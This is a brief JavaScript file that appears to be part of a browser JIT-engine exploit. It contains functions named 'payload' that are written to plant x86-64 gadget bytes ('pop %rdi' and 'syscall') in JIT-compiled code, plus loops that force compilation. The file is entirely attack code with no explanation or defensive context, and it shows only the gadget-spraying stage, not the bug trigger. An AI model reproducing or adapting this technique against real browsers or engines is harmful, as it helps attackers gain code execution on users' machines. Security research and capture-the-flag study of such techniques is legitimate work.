var array1 = new Uint8Array();
var array2 = new Uint16Array();
var pro = { f: 0x05, s: 0xc3 };

function payload(v1) {
	//pop %rdi and syscall
	var g10 = v1 * 0x1111;
	var g11 = v1 * 0x2222;
	var g12 = v1 * 0x3333;
	var g13 = v1 * 0x4444;
	var g14 = v1 * 0x5555;
	var g15 = v1 * 0x6666;
	var g16 = v1 * 0x7777;
	var g17 = v1 * 0x8888;
	var g18 = v1 * 0x9999;
	var g19 = v1 * 0x1212;
	var g20 = v1 * 0x2323;
	array1[0x5f] = 0xc3;
	array1[0x0f] = 0x5;

	return g10 ^ g11 ^ g12 ^ g13 ^ g14 ^ g15 ^ g16 ^ g17 ^ g18 ^ g19 ^ g20;
}

function payload3(v1) {
	array2[0x31] = 0xc3f6;
	array2[v1 + 0x31] = 0xd231;
	var g10 = v1 * 0x1111;
	var g11 = v1 * 0x2222;
	var g12 = v1 * 0x3333;
	var g13 = v1 * 0x4444;
	var g14 = v1 * 0x5555;
	var g15 = v1 * 0x6666;
	var g16 = v1 * 0x7777;
	var g17 = v1 * 0x8888;
	var g18 = v1 * 0x9999;
	var g19 = v1 * 0x1212;
	g19 = g19 + g18;
	array1[0x31] = 0xc3c0;

	return g10 ^ g11 ^ g12 ^ g13 ^ g14 ^ g15 ^ g16 ^ g17 ^ g18 ^ g19 ^ g19;
}

for (var i = 0; i < 0x1000; ++i) {
	array1[i] = 0x1;
	array2[i] = 0x2;
}

var tmp = 0;
for (var i = 0; i < 0x10000; i++) {
	tmp += payload(i) + payload3(i);
}